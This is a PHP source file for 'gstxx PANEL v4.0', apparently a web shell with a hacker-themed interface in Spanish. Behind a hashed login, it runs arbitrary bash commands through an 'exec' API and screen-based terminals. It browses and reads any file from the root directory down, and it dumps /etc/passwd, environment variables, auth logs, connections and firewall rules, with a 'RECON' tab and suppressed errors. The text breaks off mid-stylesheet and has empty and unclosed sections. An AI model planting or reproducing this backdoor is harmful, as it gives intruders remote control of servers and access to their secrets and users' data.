<?php
session_start();
error_reporting(0);

$HASH_USER = '$2y$12$8slUgFjGNJy4a0LH4pNJn.NPa6LiwlIKTk0Aif.qqcK474XqW9WzO';
$HASH_PASS = '$2y$12$fJmBaFSKvgiclSbAMdqTaO6.u2RjPslu114zjpMvRl1nH0139HBRm';

function generateTermId()
{
    return bin2hex(random_bytes(8));
}


function termDir($termId)
{
    return sys_get_temp_dir() . '/gstxx_term_' . session_id() . '_' . $termId;
}


function termSessionExists($termId)
{
    $dir = termDir($termId);
    if (!file_exists("$dir/screen_session"))
        return false;
    $sess = trim(@file_get_contents("$dir/screen_session"));
    if (empty($sess))
        return false;
    $check = @shell_exec("screen -ls 2>/dev/null | grep -c '$sess'");
    return intval(trim($check)) > 0;
}


function createTermSession($termId)
{
    $dir = termDir($termId);
    @mkdir($dir, 0700, true);

    destroyTermSession($termId);
    $sessName = 'gstxx_' . substr(session_id(), 0, 8) . '_' . $termId;

    @exec("screen -dmS $sessName bash 2>/dev/null");
    usleep(500000);
    file_put_contents("$dir/screen_session", $sessName);
    return $sessName;
}


function destroyTermSession($termId)
{
    $dir = termDir($termId);
    if (file_exists("$dir/screen_session")) {
        $sess = trim(@file_get_contents("$dir/screen_session"));
        if (!empty($sess)) {
            @exec("screen -S $sess -X quit 2>/dev/null");
        }
    }

    @array_map('unlink', glob("$dir/*"));
    @rmdir($dir);
}


function sendToTerm($termId, $input)
{
    $dir = termDir($termId);
    $sess = trim(@file_get_contents("$dir/screen_session"));
    if (empty($sess))
        return false;
    $escaped = str_replace(["'", "\\"], ["'\\''", "\\\\"], $input);
    @exec("screen -S $sess -X stuff '$escaped\n' 2>/dev/null");
    return true;
}


function readTermOutput($termId)
{
    $dir = termDir($termId);
    $sess = trim(@file_get_contents("$dir/screen_session"));
    if (empty($sess))
        return '';
    $tmpFile = "$dir/hardcopy.tmp";
    @exec("screen -S $sess -X hardcopy -h $tmpFile 2>/dev/null");
    usleep(100000);
    $content = @file_get_contents($tmpFile);
    @unlink($tmpFile);

    $lines = explode("\n", $content ?: '');
    while (!empty($lines) && trim(end($lines)) === '')
        array_pop($lines);
    return implode("\n", array_slice($lines, -80));
}
function cmd($c)
{
    $o = @shell_exec($c . ' 2>/dev/null');
    return $o !== null ? trim($o) : '';
}

function getSystemInfo()
{
    $i = [];
    $load = sys_getloadavg();
    $cores = intval(cmd("nproc")) ?: 1;
    $i['cpu'] = [
        'usage' => min(round($load[0] * 100 / $cores, 1), 100),
        'cores' => $cores,
        'load' => $load,
        'model' => cmd("grep 'model name' /proc/cpuinfo|head -1|cut -d: -f2") ?: 'Unknown',
        'freq' => cmd("grep 'cpu MHz' /proc/cpuinfo|head -1|awk '{print $4}'") . ' MHz'
    ];
    $m = preg_split('/\s+/', cmd("free -m|grep Mem"));
    $mt = intval($m[1] ?? 0);
    $mu = intval($m[2] ?? 0);
    $i['mem'] = [
        'total' => $mt,
        'used' => $mu,
        'free' => $mt - $mu,
        'pct' => $mt > 0 ? round($mu / $mt * 100, 1) : 0
    ];
    $sw = preg_split('/\s+/', cmd("free -m|grep Swap"));
    $st = intval($sw[1] ?? 0);
    $su = intval($sw[2] ?? 0);
    $i['swap'] = [
        'total' => $st,
        'used' => $su,
        'pct' => $st > 0 ? round($su / $st * 100, 1) : 0
    ];
    $nv = cmd("nvidia-smi --query-gpu=utilization.gpu,memory.total,memory.used,temperature.gpu,name --format=csv,noheader,nounits");
    if ($nv) {
        $g = array_map('trim', explode(',', $nv));
        $i['gpu'] = [
            'usage' => intval($g[0] ?? 0),
            'mem_total' => round(($g[1] ?? 0) / 1024, 1),
            'mem_used' => round(($g[2] ?? 0) / 1024, 1),
            'temp' => $g[3] ?? 0,
            'name' => $g[4] ?? 'GPU'
        ];
    } else {
        $i['gpu'] = ['usage' => 0, 'name' => 'No GPU', 'mem_total' => 0, 'mem_used' => 0, 'temp' => 0];
    }
    $ifs = [];
    foreach (explode("\n", cmd("ip -o addr show|grep 'inet '|awk '{print $2,$4}'")) as $l) {
        if (empty(trim($l)))
            continue;
        $p = explode(' ', trim($l));
        if (count($p) >= 2)
            $ifs[] = ['n' => $p[0], 'ip' => explode('/', $p[1])[0]];
    }
    $i['net'] = $ifs;
    $i['host'] = cmd("hostname") ?: 'localhost';
    $i['up'] = cmd("uptime -p") ?: 'N/A';
    $i['kern'] = cmd("uname -r") ?: 'N/A';
    $i['os'] = cmd("grep PRETTY_NAME /etc/os-release|cut -d= -f2|tr -d '\"'") ?: 'Linux';
    $i['arch'] = cmd("uname -m") ?: 'N/A';
    $i['user'] = cmd("whoami") ?: 'N/A';
    $i['priv'] = cmd("id") ?: 'N/A';

    $disks = [];
    foreach (explode("\n", cmd("df -h|grep '^/dev'")) as $dl) {
        if (empty(trim($dl)))
            continue;
        $dp = preg_split('/\s+/', trim($dl));
        if (count($dp) >= 6) {
            $disks[] = [
                'dev' => $dp[0],
                'size' => $dp[1],
                'used' => $dp[2],
                'avail' => $dp[3],
                'pct' => intval($dp[4]),
                'mount' => $dp[5]
            ];
        }
    }
    $i['disks'] = $disks;
    return $i;
}

function getProcesses($sort = 'cpu', $count = 25)
{
    $s = $sort === 'mem' ? '-%mem' : '-%cpu';
    $o = cmd("ps aux --sort=$s|head -" . ($count + 1));
    $ps = [];
    foreach (explode("\n", $o) as $n => $l) {
        if ($n === 0 || empty(trim($l)))
            continue;
        $p = preg_split('/\s+/', trim($l), 11);
        if (count($p) >= 11) {
            $ps[] = [
                'u' => $p[0],
                'pid' => $p[1],
                'cpu' => $p[2],
                'mem' => $p[3],
                'vsz' => $p[4],
                'rss' => $p[5],
                'stat' => $p[7],
                'start' => $p[8],
                'time' => $p[9],
                'cmd' => $p[10]
            ];
        }
    }
    return $ps;
}

function getConnections()
{
    $o = cmd("ss -tunap|tail -n +2|head -40");
    $cs = [];
    foreach (explode("\n", $o) as $l) {
        if (empty(trim($l)))
            continue;
        $p = preg_split('/\s+/', trim($l));
        if (count($p) >= 5) {
            $cs[] = [
                'proto' => $p[0],
                'state' => $p[1],
                'local' => $p[4] ?? '',
                'foreign' => $p[5] ?? '',
                'proc' => $p[6] ?? ''
            ];
        }
    }
    return $cs;
}

function getCrontabs()
{
    return cmd("crontab -l 2>/dev/null") ?: 'No crontab entries';
}

function getUsers()
{
    $o = cmd("cat /etc/passwd|grep -v nologin|grep -v /bin/false");
    $us = [];
    foreach (explode("\n", $o) as $l) {
        if (empty(trim($l)))
            continue;
        $p = explode(':', $l);
        if (count($p) >= 7) {
            $us[] = [
                'name' => $p[0],
                'uid' => $p[2],
                'gid' => $p[3],
                'home' => $p[5],
                'shell' => $p[6]
            ];
        }
    }
    return $us;
}

function getLastLogins()
{
    return cmd("last -20") ?: 'No login records';
}

function getFirewall()
{
    $ipt = cmd("iptables -L -n 2>/dev/null") ?: '';
    $ufw = cmd("ufw status verbose 2>/dev/null") ?: '';
    return $ipt ?: $ufw ?: 'No firewall data available';
}

function fileBrowser($path)
{
    $path = realpath($path) ?: '/';
    $items = [];
    if ($dh = @opendir($path)) {
        while (($f = readdir($dh)) !== false) {
            if ($f === '.')
                continue;
            $fp = $path . '/' . $f;
            $stat = @stat($fp);
            $items[] = [
                'name' => $f,
                'path' => $fp,
                'dir' => is_dir($fp),
                'size' => is_file($fp) ? filesize($fp) : 0,
                'perms' => substr(sprintf('%o', fileperms($fp)), -4),
                'owner' => function_exists('posix_getpwuid') ? (posix_getpwuid($stat['uid'])['name'] ?? $stat['uid']) : $stat['uid'],
                'mtime' => date('Y-m-d H:i', $stat['mtime'] ?? 0),
                'readable' => is_readable($fp),
                'writable' => is_writable($fp),
            ];
        }
        closedir($dh);
    }
    usort($items, function ($a, $b) {
        if ($a['name'] === '..')
            return -1;
        if ($b['name'] === '..')
            return 1;
        if ($a['dir'] !== $b['dir'])
            return $b['dir'] - $a['dir'];
        return strcasecmp($a['name'], $b['name']);
    });
    return ['path' => $path, 'items' => $items];
}

function readFileContent($path, $maxBytes = 65536)
{
    if (!is_file($path) || !is_readable($path))
        return ['error' => 'Cannot read file'];
    $size = filesize($path);
    $mime = mime_content_type($path) ?: 'application/octet-stream';
    $binary = (strpos($mime, 'text') === false && strpos($mime, 'json') === false && strpos($mime, 'xml') === false && strpos($mime, 'javascript') === false);
    if ($binary) {
        return ['path' => $path, 'size' => $size, 'mime' => $mime, 'binary' => true, 'content' => '[Binary file: ' . $mime . ' (' . $size . ' bytes)]'];
    }
    $content = file_get_contents($path, false, null, 0, $maxBytes);
    return ['path' => $path, 'size' => $size, 'mime' => $mime, 'binary' => false, 'content' => $content, 'truncated' => $size > $maxBytes];
}

function formatBytes($b)
{
    if ($b >= 1073741824)
        return round($b / 1073741824, 2) . 'G';
    if ($b >= 1048576)
        return round($b / 1048576, 2) . 'M';
    if ($b >= 1024)
        return round($b / 1024, 2) . 'K';
    return $b . 'B';
}





if (isset($_GET['api'])) {
    header('Content-Type: application/json');
    if (!isset($_SESSION['authenticated'])) {
        echo json_encode(['error' => 'Unauthorized']);
        exit;
    }
    $api = $_GET['api'];

    if (in_array($api, ['term_init', 'term_send', 'term_read', 'term_kill', 'term_resize'])) {
        if ($api === 'term_init') {

            $termId = generateTermId();
            createTermSession($termId);
            echo json_encode(['status' => 'ok', 'term_id' => $termId]);
            exit;
        } else {

            $termId = $_POST['term_id'] ?? $_GET['term_id'] ?? null;
            if (!$termId) {
                echo json_encode(['error' => 'Missing term_id']);
                exit;
            }
            switch ($api) {
                case 'term_send':
                    $input = $_POST['input'] ?? '';
                    sendToTerm($termId, $input);
                    usleep(300000);
                    echo json_encode(['output' => readTermOutput($termId), 'active' => termSessionExists($termId)]);
                    break;
                case 'term_read':
                    echo json_encode(['output' => readTermOutput($termId), 'active' => termSessionExists($termId)]);
                    break;
                case 'term_kill':
                    destroyTermSession($termId);
                    echo json_encode(['status' => 'killed']);
                    break;
                case 'term_resize':
                    $cols = intval($_POST['cols'] ?? 80);
                    $rows = intval($_POST['rows'] ?? 24);
                    $dir = termDir($termId);
                    $sess = trim(@file_get_contents("$dir/screen_session"));
                    if ($sess) {
                        @exec("screen -S $sess -X width $cols $rows 2>/dev/null");
                    }
                    echo json_encode(['status' => 'ok']);
                    break;
                default:
                    echo json_encode(['error' => 'Unknown terminal API']);
            }
            exit;
        }
    }


    switch ($api) {
        case 'sysinfo':
            echo json_encode(getSystemInfo());
            break;
        case 'processes':
            echo json_encode(getProcesses($_GET['sort'] ?? 'cpu', intval($_GET['count'] ?? 25)));
            break;
        case 'connections':
            echo json_encode(getConnections());
            break;
        case 'crontabs':
            echo json_encode(['data' => getCrontabs()]);
            break;
        case 'users':
            echo json_encode(getUsers());
            break;
        case 'lastlogins':
            echo json_encode(['data' => getLastLogins()]);
            break;
        case 'firewall':
            echo json_encode(['data' => getFirewall()]);
            break;
        case 'filebrowser':
            echo json_encode(fileBrowser($_GET['path'] ?? '/'));
            break;
        case 'readfile':
            echo json_encode(readFileContent($_GET['path'] ?? ''));
            break;
        case 'exec':
            $c = $_POST['cmd'] ?? '';
            $ds = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
            $pr = proc_open("timeout 30 bash -c " . escapeshellarg($c), $ds, $pipes, $_POST['cwd'] ?? '/tmp');
            if (is_resource($pr)) {
                fclose($pipes[0]);
                $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($pr);
                echo json_encode(['output' => $out]);
            } else
                echo json_encode(['output' => 'Execution failed']);
            break;
        case 'logs':
            $type = $_GET['type'] ?? 'syslog';
            $logFiles = [
                'syslog' => '/var/log/syslog',
                'auth' => '/var/log/auth.log',
                'kern' => '/var/log/kern.log',
                'dpkg' => '/var/log/dpkg.log',
                'dmesg' => '',
                'journal' => ''
            ];
            if ($type === 'dmesg') {
                $data = cmd("dmesg|tail -50");
            } elseif ($type === 'journal') {
                $data = cmd("journalctl -n 50 --no-pager 2>/dev/null");
            } elseif (isset($logFiles[$type])) {
                $data = cmd("tail -50 " . $logFiles[$type] . " 2>/dev/null") ?: 'Log not available';
            } else
                $data = 'Unknown log type';
            echo json_encode(['data' => $data, 'type' => $type]);
            break;
        case 'envvars':
            echo json_encode(['data' => cmd("env|sort")]);
            break;
        case 'services':
            echo json_encode(['data' => cmd("systemctl list-units --type=service --state=running --no-pager|head -40")]);
            break;
        default:
            echo json_encode(['error' => 'Unknown API']);
    }
    exit;
}





if (!isset($_SESSION['authenticated'])) {
    $err = null;
    if (isset($_POST['login'])) {
        $u = trim($_POST['username'] ?? '');
        $p = trim($_POST['password'] ?? '');
        if (password_verify($u, $HASH_USER) && password_verify($p, $HASH_PASS)) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = time();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $err = "ACCESS DENIED";
        }
    }
    showLogin($err);
    exit;
}





$isTerminalWindow = isset($_GET['terminal']) && $_GET['terminal'] == '1';
if ($isTerminalWindow) {

    renderTerminalWindow();
    exit;
}


$SI = getSystemInfo();
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title><?php echo htmlspecialchars($SI['host']); ?>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box
            }

            :root {
                --c1: #00ff41;
                --c2: #00cc33;
                --c3: #009922;
                --c4: #00ff41;
                --bg: #0a0a0f;
                --bg2: #0d0d14;
                --bg3: #12121c;
                --bg4: #1a1a28;
                --red: #ff0040;
                --cyan: #00e5ff;
                --orange: #ff9100;
                --purple: #d500f9;
                --yellow: #ffea00;
                --border: #1e1e2e;
                --font: 'Courier New', monospace
            }

            @keyframes flicker {

                0%,
                100% {
                    opacity: 1
                }

                50% {
                    opacity: .97
                }
            }

            @keyframes scanline-move {
                0% {
                    top: -100%
                }

                100% {
                    top: 100%
                }
            }

            @keyframes pulse-glow {

                0%,
                100% {
                    box-shadow: 0 0 5px rgba(0, 255, 65, .2)
                }

                50% {
                    box-shadow: 0 0 20px rgba(0, 255, 65, .4)
                }
            }

            @keyframes data-stream {
                0% {
                    background-position: 0 0
                }

                100% {
                    background-position: 0 100%
                }
            }

            @keyframes slideIn {
                from {
                    opacity: 0;
                    transform: translateY(-10px)
                }

                to {
                    opacity: 1;
                    transform: translateY(0)
                }
            }

            body {
                background: var(--bg);
                color: var(--c1);
                font-family: var(--font);
                font-size: 13px;
                overflow-x: hidden;
                animation: flicker 4s infinite
            }

            body::after {
                content: '';
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                pointer-events: none;
                background: repeating-linear-gradient(0deg, rgba(0, 0, 0, .03) 0px, rgba(0, 0, 0, .03) 1px, transparent 1px, transparent 2px);
                z-index: 9999
            }


            .hud-header {
                background: linear-gradient(180deg, var(--bg3), var(--bg));
                border-bottom: 1px solid var(--c3);
                padding: 12px 20px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                position: sticky;
                top: 0;
                z-index: 100;
                backdrop-filter: blur(10px);
                flex-wrap: wrap;
                gap: 10px
            }

            .hud-logo {
                font-size: 1.4rem;
                font-weight: bold;
                text-shadow: 0 0 10px var(--c1), 0 0 20px var(--c1);
                letter-spacing: 3px;
                display: flex;
                align-items: center;
                gap: 10px
            }

            .hud-logo .pulse-dot {
                width: 8px;
                height: 8px;
                background: var(--c1);
                border-radius: 50%;
                animation: pulse-glow 2s infinite;
                box-shadow: 0 0 10px var(--c1)
            }

            .hud-stats {
                display: flex;
                gap: 18px;
                align-items: center;
                font-size: .8rem;
                flex-wrap: wrap
            }

            .hud-stat {
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 2px;
                opacity: .9
            }

            .hud-stat-val {
                color: var(--c1);
                text-shadow: 0 0 5px var(--c1)
            }

            .hud-stat-label {
                font-size: .65rem;
                opacity: .5;
                text-transform: uppercase;
                letter-spacing: 1px
            }

            .hud-clock {
                font-size: 1rem;
                text-shadow: 0 0 8px var(--cyan);
                color: var(--cyan);
                font-weight: bold
            }

            .btn-logout {
                background: transparent;
                border: 1px solid var(--red);
                color: var(--red);
                padding: 6px 14px;
                font-family: var(--font);
                font-size: .75rem;
                cursor: pointer;
                transition: all .3s;
                text-transform: uppercase;
                letter-spacing: 1px
            }

            .btn-logout:hover {
                background: var(--red);
                color: #000;
                box-shadow: 0 0 15px rgba(255, 0, 64, .5)
            }


            .nav-bar {
                display: flex;
                gap: 2px;
                padding: 8px 15px;
                background: var(--bg2);
                border-bottom: 1px solid var(--border);
                overflow-x: auto;
                flex-wrap: nowrap
            }

            .nav-btn {
                background: transparent;
                border: 1px solid transparent;
                color: var(--c3);
                padding: 8px 16px;
                font-family: var(--font);
                font-size: .75rem;
                cursor: pointer;
                transition: all .3s;
                text-transform: uppercase;
                letter-spacing: 1px;
                white-space: nowrap;
                position: relative
            }

            .nav-btn:hover {
                color: var(--c1);
                border-color: var(--c3)
            }

            .nav-btn.active {
                color: var(--c1);
                border-color: var(--c1);
                text-shadow: 0 0 8px var(--c1);
                background: rgba(0, 255, 65, .05)
            }

            .nav-btn.active::after {
                content: '';
                position: absolute;
                bottom: -1px;
                left: 20%;
                right: 20%;
                height: 2px;
                background: var(--c1);
                box-shadow: 0 0 8px var(--c1)
            }


            .main-content {
                padding: 15px;
                min-height: calc(100vh - 100px)
            }

            .section {
                display: none;
                animation: slideIn .3s ease
            }

            .section.active {
                display: block
            }


            .dash-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
                gap: 12px;
                margin-bottom: 15px
            }

            .dash-grid-wide {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
                gap: 12px
            }


            .panel {
                background: var(--bg2);
                border: 1px solid var(--border);
                border-radius: 4px;
                overflow: hidden;
                transition: all .3s
            }

            .panel:hover {
                border-color: var(--c3);
                box-shadow: 0 0 15px rgba(0, 255, 65, .08)
            }

            .panel-head {
                background: var(--bg3);
                padding: 10px 14px;
                border-bottom: 1px solid var(--border);
                display: flex;
                justify-content: space-between;
                align-items: center;
                flex-wrap: wrap;
                gap: 8px
            }

            .panel-title {
                font-size: .85rem;
                display: flex;
                align-items: center;
                gap: 8px;
                text-shadow: 0 0 5px rgba(0, 255, 65, .3)
            }

            .panel-badge {
                background: var(--c1);
                color: #000;
                padding: 1px 8px;
                font-size: .7rem;
                font-weight: bold;
                border-radius: 2px
            }

            .panel-badge.warn {
                background: var(--orange)
            }

            .panel-badge.crit {
                background: var(--red)
            }

            .panel-body {
                padding: 14px;
                overflow-x: auto
            }


            .gauge-wrap {
                display: flex;
                justify-content: center;
                margin-bottom: 12px
            }

            .gauge-svg-wrap {
                position: relative;
                width: 110px;
                height: 110px
            }

            .gauge-svg-wrap svg {
                width: 100%;
                height: 100%;
                transform: rotate(-90deg)
            }

            .gauge-center-text {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                text-align: center
            }

            .gauge-pct {
                font-size: 1.4rem;
                font-weight: bold;
                text-shadow: 0 0 10px var(--c1)
            }

            .gauge-sub {
                font-size: .6rem;
                opacity: .5;
                text-transform: uppercase
            }


            .info-row {
                display: flex;
                justify-content: space-between;
                padding: 5px 0;
                border-bottom: 1px solid rgba(255, 255, 255, .03);
                font-size: .8rem;
                flex-wrap: wrap;
                gap: 8px
            }

            .info-row:last-child {
                border: none
            }

            .info-key {
                opacity: .5
            }

            .info-val {
                text-align: right;
                word-break: break-word;
                max-width: 70%
            }


            .tbl {
                width: 100%;
                border-collapse: collapse;
                font-size: .78rem
            }

            .tbl th {
                background: var(--bg3);
                padding: 8px 10px;
                text-align: left;
                border-bottom: 1px solid var(--c3);
                font-size: .7rem;
                text-transform: uppercase;
                letter-spacing: 1px;
                opacity: .7;
                position: sticky;
                top: 0
            }

            .tbl td {
                padding: 7px 10px;
                border-bottom: 1px solid var(--border);
                max-width: 200px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap
            }

            .tbl tr:hover {
                background: rgba(0, 255, 65, .03)
            }

            .tbl .col-cpu {
                color: var(--red)
            }

            .tbl .col-mem {
                color: var(--orange)
            }

            .tbl .col-pid {
                color: var(--cyan)
            }


            .btn {
                background: transparent;
                border: 1px solid var(--c3);
                color: var(--c1);
                padding: 5px 12px;
                font-family: var(--font);
                font-size: .72rem;
                cursor: pointer;
                transition: all .2s;
                text-transform: uppercase
            }

            .btn:hover {
                background: var(--c1);
                color: #000;
                box-shadow: 0 0 10px rgba(0, 255, 65, .3)
            }

            .btn-sm {
                padding: 3px 8px;
                font-size: .68rem
            }

            .btn-danger {
                border-color: var(--red);
                color: var(--red)
            }

            .btn-danger:hover {
                background: var(--red);
                color: #000
            }

            .btn-cyan {
                border-color: var(--cyan);
                color: var(--cyan)
            }

            .btn-cyan:hover {
                background: var(--cyan);
                color: #000
            }


            .qcmd-grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
                gap: 6px
            }


            .iface {
                padding: 8px 12px;
                margin: 4px 0;
                background: var(--bg3);
                border-left: 3px solid var(--c1);
                display: flex;
                justify-content: space-between;
                font-size: .8rem;
                transition: all .2s;
                flex-wrap: wrap
            }

            .iface:hover {
                border-left-color: var(--cyan);
                background: var(--bg4)
            }


            .disk-bar-bg {
                background: var(--bg);
                border: 1px solid var(--border);
                height: 18px;
                border-radius: 2px;
                overflow: hidden;
                margin: 3px 0
            }

            .disk-bar-fill {
                height: 100%;
                background: linear-gradient(90deg, var(--c3), var(--c1));
                transition: width .5s;
                box-shadow: 0 0 8px rgba(0, 255, 65, .3)
            }

            .disk-bar-fill.warn {
                background: linear-gradient(90deg, var(--orange), #ff6600)
            }

            .disk-bar-fill.crit {
                background: linear-gradient(90deg, var(--red), #cc0000)
            }


            .fb-path {
                background: var(--bg);
                padding: 8px 12px;
                margin-bottom: 10px;
                border: 1px solid var(--border);
                font-size: .8rem;
                display: flex;
                align-items: center;
                gap: 8px;
                flex-wrap: wrap
            }

            .fb-path input {
                flex: 1;
                background: transparent;
                border: none;
                color: var(--c1);
                font-family: var(--font);
                font-size: .8rem;
                outline: none;
                min-width: 120px
            }

            .fb-item {
                display: flex;
                align-items: center;
                padding: 6px 10px;
                border-bottom: 1px solid var(--border);
                font-size: .78rem;
                cursor: pointer;
                transition: all .2s;
                gap: 10px;
                flex-wrap: wrap
            }

            .fb-item:hover {
                background: rgba(0, 255, 65, .05)
            }

            .fb-item.dir {
                color: var(--cyan)
            }

            .fb-item .fb-name {
                flex: 1;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap
            }

            .fb-item .fb-size {
                width: 70px;
                text-align: right;
                opacity: .5
            }

            .fb-item .fb-perms {
                width: 50px;
                opacity: .4;
                font-size: .7rem
            }

            .fb-item .fb-date {
                width: 120px;
                opacity: .4
            }


            .file-viewer {
                background: #000;
                color: var(--c1);
                padding: 15px;
                font-size: .8rem;
                white-space: pre-wrap;
                word-break: break-all;
                max-height: 60vh;
                overflow-y: auto;
                border: 1px solid var(--border);
                position: relative
            }

            .file-viewer .line-num {
                color: var(--c3);
                opacity: .4;
                display: inline-block;
                width: 40px;
                text-align: right;
                margin-right: 10px;
                user-select: none
            }


            .log-viewer {
                background: #000;
                color: var(--c2);
                padding: 12px;
                font-size: .78rem;
                white-space: pre-wrap;
                word-break: break-all;
                max-height: 500px;
                overflow-y: auto;
                border: 1px solid var(--border)
            }

            .log-tabs {
                display: flex;
                gap: 4px;
                margin-bottom: 10px;
                flex-wrap: wrap
            }

            .log-tab {
                background: transparent;
                border: 1px solid var(--border);
                color: var(--c3);
                padding: 5px 12px;
                font-family: var(--font);
                font-size: .7rem;
                cursor: pointer;
                transition: all .2s
            }

            .log-tab.active {
                border-color: var(--c1);
                color: var(--c1);
                text-shadow: 0 0 5px var(--c1)
            }


            .modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, .9);
                z-index: 3000;
                display: none;
                align-items: center;
                justify-content: center;
                padding: 20px
            }

            .modal-overlay.active {
                display: flex
            }

            .modal-box {
                background: var(--bg2);
                border: 1px solid var(--c1);
                width: 100%;
                max-width: 900px;
                max-height: 80vh;
                display: flex;
                flex-direction: column;
                border-radius: 4px;
                box-shadow: 0 0 30px rgba(0, 255, 65, .2)
            }

            .modal-box-head {
                background: var(--bg3);
                padding: 10px 16px;
                border-bottom: 1px solid var(--c3);
                display: flex;
                justify-content: space-between;
                align-items: center
            }

            .modal-box-body {
                flex: 1;
                overflow-y: auto;
                padding: 0
            }

            .cmd-output {
                background: #000;
                color: var(--c1);
                padding: 16px;
                font-size: .85rem;
                white-space: pre-wrap;
                word-break: break-all;
                min-height: 200px
            }


            @media(max-width:768px) {
                .hud-header {
                    flex-direction: column;
                    align-items: stretch
                }

                .hud-stats {
                    justify-content: space-between
                }

                .nav-bar {
                    padding: 6px 8px
                }

                .nav-btn {
                    padding: 6px 10px;
                    font-size: .7rem
                }

                .dash-grid,
                .dash-grid-wide {
                    grid-template-columns: 1fr
                }

                .main-content {
                    padding: 8px
                }

                .qcmd-grid {
                    grid-template-columns: repeat(2, 1fr)
                }

                .tbl td,
                .tbl th {
                    padding: 5px 6px;
                    font-size: .7rem
                }

                .info-val {
                    max-width: 100%;
                    text-align: left
                }
            }

            @media(max-width:480px) {
                .hud-logo {
                    font-size: 1rem
                }

                .hud-stats {
                    gap: 6px
                }

                .nav-btn {
                    padding: 5px 8px;
                    font-size: .65rem
                }
            }
        </style>
</head>

<body>
    <div class="hud-header">
        <div class="hud-logo"><span class="pulse-dot"></span> gstxx PANEL <span
                style="font-size:.6rem;opacity:.4">v4.0</span></div>
        <div class="hud-stats">
            <div class="hud-stat"><span class="hud-stat-val" id="hud-cpu">--</span><span
                    class="hud-stat-label">CPU</span></div>
            <div class="hud-stat"><span class="hud-stat-val" id="hud-mem">--</span><span
                    class="hud-stat-label">MEM</span></div>
            <div class="hud-stat"><span class="hud-stat-val"
                    id="hud-host"><?php echo htmlspecialchars($SI['host']); ?></span><span
                    class="hud-stat-label">HOST</span></div>
            <div class="hud-stat"><span class="hud-stat-val"
                    id="hud-user"><?php echo htmlspecialchars($SI['user']); ?></span><span
                    class="hud-stat-label">USER</span></div>
            <div class="hud-stat"><span class="hud-clock" id="hud-clock">--:--:--</span><span
                    class="hud-stat-label">TIME</span></div>
            <a href="?logout=1" class="btn-logout">⏻ LOGOUT</a>
        </div>
    </div>

    <div class="nav-bar">
        <button class="nav-btn active" data-section="dashboard">[+] DASHBOARD</button>
        <button class="nav-btn" data-section="processes">[!] PROCESOS</button>
        <button class="nav-btn" data-section="network">[+] RED</button>
        <button class="nav-btn" data-section="disks">[+] DISCOS</button>
        <button class="nav-btn" data-section="files">[+] ARCHIVOS</button>
        <button class="nav-btn" data-section="logs">[+] LOGS</button>
        <button class="nav-btn" data-section="users">[+] USUARIOS</button>
        <button class="nav-btn" data-section="services">[+]️ SERVICIOS</button>
        <button class="nav-btn" data-section="recon">[+] RECON</button>
        <button class="nav-btn" onclick="openNewTerminal()" style="color:var(--cyan);border-color:var(--cyan)">[+] NUEVA
            TERMINAL</button>
    </div>

    <div class="main-content">


    </div>

    <script>
        const API = window.location.pathname;

        function openNewTerminal() {

            window.open(API + '?terminal=1', '_blank', 'width=800,height=600,resizable=yes,scrollbars=yes');
        }


    </script>
</body>

</html>

<?php




function renderTerminalWindow()
{
    ?>
    <!DOCTYPE html>
    <html lang="es">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
        <title>gstxx TERMINAL</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box
            }

            :root {
                --c1: #00ff41;
                --c2: #00cc33;
                --c3: #009922;
                --bg: #0a0a0f;
                --bg2: #0d0d14;
                --bg3: #12121c;
                --red: #ff0040;
                --cyan: #00e5ff;
                --yellow: #ffea00;
                --font: 'Courier New', monospace
            }

            body {
                background: var(--bg);
                color: var(--c1);
                font-family: var(--font);
                font-size: 14px;
                overflow: hidden;
                height: 100vh;
                display: flex;
                flex-direction: column
            }

            .term-bar {
                background: var(--bg3);
                padding: 8px 15px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                border-bottom: 1px solid var(--c3);
                flex-wrap: wrap;
                gap: 8px
            }

            .term-bar-title {
                font-size: .85rem;
                display: flex;
                align-items: center;
                gap: 8px
            }

            .term-body {
                flex: 1;
                display: flex;
                flex-direction: column;
                overflow: hidden
            }

            .term-output {
                flex: 1;
                background: #000;
                color: var(--c1);
                padding: 12px 15px;
                font-family: var(--font);
                font-size: .88rem;
                white-space: pre-wrap;
                word-break: break-all;
                overflow-y: auto;
                line-height: 1.4
            }

            .term-input-row {
                display: flex;
                align-items: center;
                background: var(--bg3);
                padding: 8px 12px;
                border-top: 1px solid var(--c3);
                gap: 8px;
                flex-wrap: wrap
            }

            .term-prompt {
                color: var(--c1);
                font-size: .85rem;
                white-space: nowrap
            }

            .term-input {
                flex: 1;
                background: transparent;
                border: none;
                color: #fff;
                font-family: var(--font);
                font-size: .88rem;
                outline: none;
                caret-color: var(--c1);
                min-width: 100px
            }

            .term-status {
                font-size: .7rem;
                opacity: .4;
                padding: 4px 15px;
                background: var(--bg2);
                display: flex;
                justify-content: space-between;
                flex-wrap: wrap
            }

            .btn {
                background: transparent;
                border: 1px solid var(--c3);
                color: var(--c1);
                padding: 4px 10px;
                font-family: var(--font);
                font-size: .7rem;
                cursor: pointer;
                transition: all .2s;
                text-transform: uppercase
            }

            .btn:hover {
                background: var(--c1);
                color: #000;
                box-shadow: 0 0 10px rgba(0, 255, 65, .3)
